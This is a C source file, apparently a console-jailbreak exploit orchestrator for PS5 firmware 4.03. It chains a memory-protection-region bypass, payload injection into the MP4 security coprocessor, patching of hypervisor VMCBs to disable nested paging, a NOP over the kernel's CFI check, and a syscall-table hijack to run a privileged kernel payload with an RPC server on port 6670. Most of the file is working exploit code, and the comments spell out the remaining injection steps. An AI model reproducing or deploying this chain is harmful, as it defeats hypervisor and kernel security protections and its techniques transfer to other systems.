/*
 * Prosperous exploit orchestrator for PS5 FW 4.03.
 *
 * This is the main entry point that chains together all exploit stages:
 *
 *   Stage 1: TMR Bypass
 *     - Disable TMR 20 (MP4 carveout) for x86 write access to MP4 DRAM
 *     - Create TMR 21 covering kernel text region with all-access
 *     - Disable TMR 5/17/18 (HV region protections)
 *
 *   Stage 2: MP4 Payload Injection
 *     - Write AArch64 EL3 thunk to MP4 DRAM at 0x600E0000
 *     - Write main payload to 0x607F1000
 *     - Hook mDbg_intr → thunk → payload
 *     - Enable QAF flag to activate
 *
 *   Stage 3: VMCB Patching
 *     - Setup SysHub TLB entries to map HV memory via MP4
 *     - Read vCPU contexts and VMCB pointers
 *     - Disable nested paging (NP_ENABLE=0) on all VMCBs
 *     - Clear most intercepts (keep VMSAVE/VMLOAD/VMMCALL/VMRUN)
 *
 *   Stage 4: TMR Restore
 *     - Re-enable TMR 20 (prevents kernel panic on game restart)
 *     - Restore HV TMR protections (5/17/18)
 *
 *   Stage 5: CFI Bypass + Kernel Payload
 *     - NOP the cfi_check_fail function via MP4 write
 *     - Inject kpayload via syscall table hijack
 *     - kpayload disables NDA on all cores, elevates privileges
 *     - Starts TCP RPC server on port 6670
 *
 * Prerequisites:
 *   - Kernel R/W via kekcall (ps5-kstuff or equivalent loaded)
 *   - Physical memory access via DMAP
 *   - Network connectivity to PS5
 *
 * Build: Part of the prosperous_port PS5 payload SDK build.
 * Deploy: Via PS5_DEPLOY to console running on FW 4.03.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/*
 * Discover the DMAP base address by reading the current process's pmap.
 *
 * The DMAP base is computed as: pm_pml4 (kernel VA) - pm_cr3 (PA)
 * This gives the kernel's direct-map base for physical memory.
 */
static int discover_dmap_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t vmspace;
    uint64_t pm_pml4;
    uint64_t pm_cr3;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0) {
        printf("[!] Failed to get proc address\n");
        return -1;
    }

    /* proc -> p_vmspace */
    kernel_copyout(proc_addr + OFF_PROC_P_VMSPACE, &vmspace, sizeof(vmspace));

    /* vmspace -> vm_pmap -> pm_pml4 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_PML4,
                   &pm_pml4, sizeof(pm_pml4));

    /* vmspace -> vm_pmap -> pm_cr3 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_CR3,
                   &pm_cr3, sizeof(pm_cr3));

    ctx->dmap_base = pm_pml4 - pm_cr3;
    ctx->proc_cr3 = pm_cr3;
    printf("[*] DMAP base: 0x%lx\n", ctx->dmap_base);
    printf("[*] Process CR3: 0x%lx\n", ctx->proc_cr3);

    return 0;
}

/*
 * Discover the kernel text base address.
 *
 * We scan kernel data for the kernel pmap structure by looking for
 * characteristic field values, or use the LSTAR MSR approach.
 */
static int discover_kernel_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t sysvec;
    uint64_t sysent;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0)
        return -1;

    /* Read kernel text base from the process's sysvec.
     * proc -> p_sysent -> sysvec points to the system call vector,
     * which is in kernel .data and gives us a reference address. */
    kernel_copyout(proc_addr + OFF_PROC_P_SYSENT, &sysvec, sizeof(sysvec));
    kernel_copyout(sysvec + OFF_SYSVEC_SYSENT, &sysent, sizeof(sysent));

    /* The sysent table is at a known offset from kernel base.
     * We can also read ktext_start_va from the TMR 16 base. */

    /* Alternative: use TMR 16 base to get kernel text PA,
     * then read the VA from a known offset */
    uint32_t tmr16_base;
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;
    uint32_t tmr16_addr = 16 * 0x10;

    kernel_copyin(&tmr16_addr, ind_index_kva, sizeof(tmr16_addr));
    kernel_copyout(ind_data_kva, &tmr16_base, sizeof(tmr16_base));

    ctx->ktext_base_pa = (uint64_t)tmr16_base << 16;

    printf("[*] Kernel text PA: 0x%lx\n", ctx->ktext_base_pa);

    /* Derive kernel text VA from DMAP: any kernel VA = DMAP + PA works
     * for accessing kernel data via kernel_copyout. We use DMAP+PA
     * for all accesses since KOFF_KTEXT_VA_PTR is FW-specific and
     * unreliable across firmware versions. */
    ctx->ktext_base = ctx->dmap_base + ctx->ktext_base_pa;
    printf("[*] Kernel text (DMAP): 0x%lx\n", ctx->ktext_base);

    /* Get kernel PML4 PA */
    uint64_t kpmap_addr = ctx->ktext_base + KOFF_KERNEL_PMAP;
    uint64_t kpmap;
    kernel_copyout(kpmap_addr, &kpmap, sizeof(kpmap));
    kernel_copyout(kpmap + OFF_PMAP_PM_CR3, &ctx->kpml4_pa, sizeof(ctx->kpml4_pa));

    printf("[*] Kernel PML4 PA: 0x%lx\n", ctx->kpml4_pa);

    return 0;
}

/*
 * NOP the cfi_check_fail function via MP4 memory write.
 *
 * This is necessary because the kernel uses Control Flow Integrity (CFI)
 * checks that would trap our syscall table hijack. By NOPing the check
 * function, we prevent CFI from blocking our payload execution.
 *
 * We use the MP4 coprocessor to write to kernel text because it has
 * its own DMA path that bypasses x86 page table NX/RO protections.
 */
static int cfi_bypass(struct phys_rw_ctx *ctx)
{
    uint64_t cfi_check_fail_pa = ctx->ktext_base_pa + KOFF_CFI_CHECK_FAIL;
    uint32_t nop_sled = 0xC3C3C3C3; /* ret; ret; ret; ret */

    /* Setup SysHub TLB to map the kernel text region */
    if (mp4_syshub_tlb_setup(ctx, 32, cfi_check_fail_pa) != 0) {
        printf("[!] Failed to setup SysHub TLB for CFI bypass\n");
        return -1;
    }

    /* Write NOP/RET over cfi_check_fail via MP4 */
    uint32_t mp4_va = 0x80000000 + (cfi_check_fail_pa & 0x03FFFFFF);
    mp4_write32(ctx, mp4_va, nop_sled);

    printf("[*] CFI check_fail patched at PA 0x%lx\n", cfi_check_fail_pa);
    return 0;
}

/*
 * Main exploit entry point.
 */
int prosperous_run(void)
{
    struct phys_rw_ctx ctx;
    int ret;

    /* Disable stdout buffering so all diagnostics are visible */
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("========================================\n");
    printf(" prosperous_port - PS5 HV Bypass\n");
    printf(" FW 4.03 (CEX)\n");
    printf(" Ported from fail0verflow/prosperous\n");
    printf("========================================\n\n");

    /* Phase 0: Discover memory layout */
    printf("[*] Phase 0: Discovering memory layout...\n");

    ret = discover_dmap_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover DMAP base\n");
        return ret;
    }

    ret = discover_kernel_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover kernel base\n");
        return ret;
    }

    /* Phase 1: TMR bypass */
    printf("\n[*] Phase 1: TMR bypass...\n");

    ret = tmr_bypass_init(&ctx);
    if (ret != 0) {
        printf("[!] TMR bypass init failed: %d\n", ret);
        return ret;
    }
    printf("[+] TMR 20 disabled, TMR 21 created\n");

    /* Phase 1.5: GPU SDMA path and DRAM analysis
     *
     * CONFIRMED (all previous runs):
     *   ACCESSIBLE: PA 0x605F0000-0x60FFFFFF (64KB + 6MB) — R/W works
     *   BLOCKED:    PA 0x60000000-0x605EFFFF — no PDE, rc=-1 safe
     *   GPU at B32:D0:F0 (0x13FB1002) behind bridge B0:D8:F1
     *   GPU MMIO at BAR2=0xE000000C returned all 0xFFFFFFFF
     *   Write test passed (0xCAFEBABE at PA 0x60700000)
     *
     * THIS ITERATION: Diagnose why GPU MMIO fails.
     *   A. Read GPU PCI config (command reg, full BAR decode, status)
     *   B. Read PCIe bridge memory forwarding windows
     *   C. Dump more of the descriptor table at PA 0x607F0000
     *   D. Dump the 64KB boundary region for A53 data structures
     */
    printf("\n[*] Phase 1.5: GPU config and DRAM analysis...\n");
    {
        uint64_t dmap = ctx.dmap_base;

        /* === Part A: Full GPU PCI config decode ===
         * GPU at B32:D0:F0. Read command register, all BARs (including
         * BAR1/BAR3 for 64-bit address upper halves), and status.
         * SAFE: PCI config reads on bus 32 worked in previous runs. */
        printf("[*] Part A: GPU PCI config (B32:D0:F0)...\n");
        {
            uint64_t gpu_ecam = dmap + MMCFG_BASE +
                (32ULL << 20) + (0ULL << 15) + (0ULL << 12);

            /* Read and decode all important registers */
            uint32_t cmd_status, bars[6];
            kernel_copyout(gpu_ecam + 0x04, &cmd_status, 4);
            printf("[GPU] Command/Status: 0x%08x\n", cmd_status);
            printf("[GPU]   MemSpace=%d IOSpace=%d BusMaster=%d\n",
                   (cmd_status >> 1) & 1, cmd_status & 1,
                   (cmd_status >> 2) & 1);

            for (int i = 0; i < 6; i++) {
                kernel_copyout(gpu_ecam + 0x10 + i * 4, &bars[i], 4);
                printf("[GPU] BAR%d = 0x%08x\n", i, bars[i]);
            }

            /* Decode 64-bit BARs */
            uint64_t bar0_full = ((uint64_t)bars[1] << 32) |
                                 (bars[0] & ~0xFULL);
            uint64_t bar2_full = ((uint64_t)bars[3] << 32) |
                                 (bars[2] & ~0xFULL);
            printf("[GPU] BAR0 (VRAM) full 64-bit PA = 0x%llx\n",
                   (unsigned long long)bar0_full);
            printf("[GPU] BAR2 (MMIO) full 64-bit PA = 0x%llx\n",
                   (unsigned long long)bar2_full);
            printf("[GPU] BAR5 (Doorbell) PA = 0x%08x\n",
                   bars[5] & ~0xFU);

            /* Read subsystem ID and ROM BAR */
            uint32_t subsys;
            kernel_copyout(gpu_ecam + 0x2C, &subsys, 4);
            printf("[GPU] Subsystem: 0x%08x\n", subsys);

            /* Test read at the CORRECT GPU MMIO address */
            if (bar2_full != 0 && bar2_full != 0xFFFFFFFF0ULL) {
                printf("[GPU] Testing MMIO read at correct BAR2...\n");
                uint32_t test_val = 0xDEADDEAD;
                int32_t rc = kernel_copyout(dmap + bar2_full, &test_val, 4);
                printf("[GPU] MMIO[0x%llx]+0 = 0x%08x (rc=%d)\n",
                       (unsigned long long)bar2_full, test_val, rc);

                /* Try a few more offsets */
                uint32_t probe_offsets[] = {0x2000, 0x5000, 0xD000};
                for (int i = 0; i < 3; i++) {
                    test_val = 0xDEADDEAD;
                    rc = kernel_copyout(dmap + bar2_full + probe_offsets[i],
                                       &test_val, 4);
                    printf("[GPU] MMIO+0x%x = 0x%08x (rc=%d)\n",
                           probe_offsets[i], test_val, rc);
                }
            }
        }

        /* === Part B: PCIe bridge memory forwarding windows ===
         * Bridge B0:D8:F1 forwards bus 32 traffic. Read its memory
         * base/limit registers to understand which PA ranges it forwards.
         * SAFE: PCI config reads. */
        printf("\n[*] Part B: PCIe bridge forwarding config (B0:D8:F1)...\n");
        {
            uint64_t br_ecam = dmap + MMCFG_BASE +
                (0ULL << 20) + (8ULL << 15) + (1ULL << 12);

            uint32_t cmd_status;
            kernel_copyout(br_ecam + 0x04, &cmd_status, 4);
            printf("[BRIDGE] Command/Status: 0x%08x\n", cmd_status);
            printf("[BRIDGE]   MemSpace=%d BusMaster=%d\n",
                   (cmd_status >> 1) & 1, (cmd_status >> 2) & 1);

            uint32_t bus_reg;
            kernel_copyout(br_ecam + 0x18, &bus_reg, 4);
            printf("[BRIDGE] Buses: pri=%u sec=%u sub=%u\n",
                   bus_reg & 0xFF, (bus_reg >> 8) & 0xFF,
                   (bus_reg >> 16) & 0xFF);

            /* Memory window (non-prefetchable) */
            uint32_t mem_reg;
            kernel_copyout(br_ecam + 0x20, &mem_reg, 4);
            uint32_t mem_base = (mem_reg & 0xFFF0) << 16;
            uint32_t mem_limit = (mem_reg >> 16) << 16 | 0xFFFFF;
            printf("[BRIDGE] Memory window: 0x%08x - 0x%08x\n",
                   mem_base, mem_limit);

            /* Prefetchable memory window */
            uint32_t pref_reg;
            kernel_copyout(br_ecam + 0x24, &pref_reg, 4);
            uint32_t pref_base_lo = (pref_reg & 0xFFF0) << 16;
            uint32_t pref_limit_lo = (pref_reg >> 16) << 16 | 0xFFFFF;

            uint32_t pref_base_hi, pref_limit_hi;
            kernel_copyout(br_ecam + 0x28, &pref_base_hi, 4);
            kernel_copyout(br_ecam + 0x2C, &pref_limit_hi, 4);

            uint64_t pref_base = ((uint64_t)pref_base_hi << 32) | pref_base_lo;
            uint64_t pref_limit = ((uint64_t)pref_limit_hi << 32) |
                                  pref_limit_lo;
            printf("[BRIDGE] Prefetchable window: 0x%llx - 0x%llx\n",
                   (unsigned long long)pref_base,
                   (unsigned long long)pref_limit);
        }

        /* === Part C: Expanded descriptor table dump ===
         * PA 0x607F0000 had interesting values (0x88000000, 0x005F0000).
         * Dump 256 bytes to understand the full structure.
         * SAFE: PD[0x103] range, proven accessible. */
        printf("\n[*] Part C: Descriptor table at PA 0x607F0000...\n");
        {
            uint32_t buf[64]; /* 256 bytes */
            for (int w = 0; w < 64; w++)
                kernel_copyout(dmap + 0x607F0000ULL + w * 4, &buf[w], 4);
            for (int row = 0; row < 16; row++) {
                printf("[DESC] +%03x: %08x %08x %08x %08x\n",
                       row * 16, buf[row*4], buf[row*4+1],
                       buf[row*4+2], buf[row*4+3]);
            }
        }

        /* === Part D: Dump 64KB boundary region (PA 0x605F0000) ===
         * This is the lowest accessible DRAM. Dump first 128 bytes
         * of each page to look for function pointers, vtables,
         * or other hookable data structures.
         * SAFE: all 16 pages confirmed accessible in previous run. */
        printf("\n[*] Part D: Boundary region dump (PA 0x605F0000)...\n");
        {
            /* Dump first 64 bytes of each of the 16 accessible pages */
            for (int page = 0; page < 16; page++) {
                uint64_t pa = 0x605F0000ULL + page * 0x1000;
                uint32_t buf[16]; /* 64 bytes */
                for (int w = 0; w < 16; w++)
                    kernel_copyout(dmap + pa + w * 4, &buf[w], 4);

                /* Check if page is all zeros or all same value */
                int interesting = 0;
                for (int w = 0; w < 16; w++) {
                    if (buf[w] != 0 && buf[w] != buf[0]) {
                        interesting = 1;
                        break;
                    }
                }
                if (buf[0] != 0) interesting = 1;

                if (interesting) {
                    printf("[BNDRY] PA 0x%llx (page %d):\n",
                           (unsigned long long)pa, page);
                    for (int row = 0; row < 4; row++) {
                        printf("  +%02x: %08x %08x %08x %08x\n",
                               row * 16, buf[row*4], buf[row*4+1],
                               buf[row*4+2], buf[row*4+3]);
                    }
                }
            }
        }
    }

    /* Phase 2: MP4 payload injection */
    printf("\n[*] Phase 2: MP4 payload injection...\n");

    ret = mp4_inject_payload(&ctx);
    if (ret != 0) {
        printf("[!] MP4 payload injection failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload injected and activated\n");

    /* Re-enable TMR 20 after injection (matches original prosperous flow).
     * The A53 accesses its own DRAM through its IOMMU, not through x86 TMR.
     * Leaving TMR 20 disabled causes kernel panics on game restart. */
    tmr_restore_tmr20(&ctx);
    printf("[+] TMR 20 restored\n");

    /* Give the A53 time to process the QAF flag and activate the payload.
     * The payload hooks mDbg_intr via SError handler - the A53 needs to
     * take an interrupt cycle to activate the hook. */
    printf("[*] Waiting for MP4 payload activation...\n");
    usleep(500000); /* 500ms */

    /* Diagnostic: read c2p reg 0 to see if a previous command is stuck */
    {
        uint32_t c2p0_val;
        uint64_t bar2_kva = ctx.dmap_base + MP4_BAR2_PA;
        kernel_copyout(bar2_kva + MP4_C2P_REG(0, 0), &c2p0_val, sizeof(c2p0_val));
        printf("[DIAG] c2p reg 0 before ping: 0x%08x\n", c2p0_val);

        /* Also read p2c reg 0 to check if A53 has sent anything */
        uint32_t p2c0_val;
        kernel_copyout(bar2_kva + MP4_P2C_REG0(0), &p2c0_val, sizeof(p2c0_val));
        printf("[DIAG] p2c reg 0: 0x%08x\n", p2c0_val);
    }

    /* Verify MP4 payload is alive (retry a few times) */
    for (int attempt = 0; attempt < 5; attempt++) {
        ret = mp4_ping(&ctx);
        if (ret == 0)
            break;
        printf("[*] MP4 ping attempt %d failed, retrying...\n", attempt + 1);
        usleep(500000);
    }
    if (ret != 0) {
        printf("[!] MP4 payload not responding after retries\n");
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload ping OK\n");

    /* Phase 3: Disable HV TMR protections */
    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");

    ret = tmr_disable_hv_regions(&ctx);
    if (ret != 0) {
        printf("[!] HV TMR disable failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] HV TMR protections disabled\n");

    /* Phase 4: VMCB patching */
    printf("\n[*] Phase 4: VMCB patching (disabling nested paging)...\n");

    ret = vmcb_patch_disable_np(&ctx);
    if (ret != 0) {
        printf("[!] VMCB patching failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] Nested paging disabled on all VMCBs\n");

    /* Phase 5: CFI bypass */
    printf("\n[*] Phase 5: CFI bypass...\n");

    ret = cfi_bypass(&ctx);
    if (ret != 0) {
        printf("[!] CFI bypass failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] CFI check_fail patched\n");

    /* Phase 6: Restore TMR protections */
    printf("\n[*] Phase 6: Restoring TMR protections...\n");
    tmr_restore_hv_regions(&ctx);
    printf("[+] TMR protections restored\n");

    /* Phase 7: Kernel payload injection */
    printf("\n[*] Phase 7: Kernel payload injection...\n");
    printf("[*] kpayload will be injected via syscall table hijack.\n");
    printf("[*] After injection, connect to port 6670 for RPC access.\n");

    ret = kpayload_inject(&ctx);
    if (ret != 0) {
        printf("[!] kpayload injection failed: %d\n", ret);
        return ret;
    }

    printf("\n========================================\n");
    printf(" [+] Exploit complete!\n");
    printf(" [+] RPC server listening on port 6670\n");
    printf(" [+] Connect with: python3 client.py\n");
    printf("========================================\n");

    return 0;
}

/*
 * Kernel payload injection via syscall table hijack.
 *
 * This follows the same approach as prosperous:
 *   1. Allocate userspace buffer for kpayload binary
 *   2. Map it with a 1GB page at 0xFFFFFFC0_00000000 for kernel access
 *   3. Temporarily replace syscall 8's handler with our payload
 *   4. Invoke syscall 8 to execute the payload in kernel context
 *   5. Restore the original syscall handler
 *
 * The kpayload binary must be loaded from disk or embedded.
 */
int kpayload_inject(struct phys_rw_ctx *ctx)
{
    printf("[*] kpayload injection placeholder\n");
    printf("[*] To complete: load kpayload binary and inject via sysent hijack\n");
    printf("[*] See pwn_mp4.lua from prosperous for the full injection flow\n");

    /*
     * TODO: Full implementation would:
     *
     * 1. Load kpayload binary from /mnt/usb0/kpayload or embed it
     *
     * 2. mmap a buffer and copy kpayload into it:
     *    void *payload_buf = mmap(NULL, size, PROT_READ|PROT_WRITE,
     *                             MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
     *    memcpy(payload_buf, kpayload_data, kpayload_size);
     *
     * 3. Get physical address of payload buffer:
     *    uint64_t payload_pa = vtophys(payload_buf);
     *
     * 4. Create a 1GB kernel mapping:
     *    uint64_t payload_kva = 0xFFFFFFC000000000 | (payload_pa & 0x3FFFFFFF);
     *    // Write PDPE at kpml4[0xFF8] + 0x800
     *    uint64_t pdp_pa = (read_phys64(kpml4_pa + 0xFF8) >> 12) << 12;
     *    write_phys64(pdp_pa + 0x800,
     *                 ((payload_pa >> 30) << 30) | 0x83);  // 1GB page, RWX
     *
     * 5. Read current sysent[8] and replace:
     *    // proc -> sysvec -> sysent
     *    uint64_t sysent_8_pa = get_pa(sysent_va + 0x30 * 8);
     *    uint64_t orig_call = read_phys64(sysent_8_pa + 8);
     *    write_phys32(sysent_8_pa, 8);  // narg = 8
     *    write_phys64(sysent_8_pa + 8, payload_kva);
     *
     * 6. Invoke syscall 8 multiple times (progressive init):
     *    syscall(8, ktext_base, payload_buf, host_addr, 0);  // op=0: version check
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 1);  // op=1: reloc
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 2);  // op=2: nda disable
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 3);  // op=3: full init
     *
     * 7. Restore sysent[8]:
     *    write_phys32(sysent_8_pa, 0);
     *    write_phys64(sysent_8_pa + 8, orig_call);
     *
     * 8. Clean up kernel mapping:
     *    write_phys64(pdp_pa + 0x800, 0);
     */

    return 0;
}

int main(void)
{
    return prosperous_run();
}
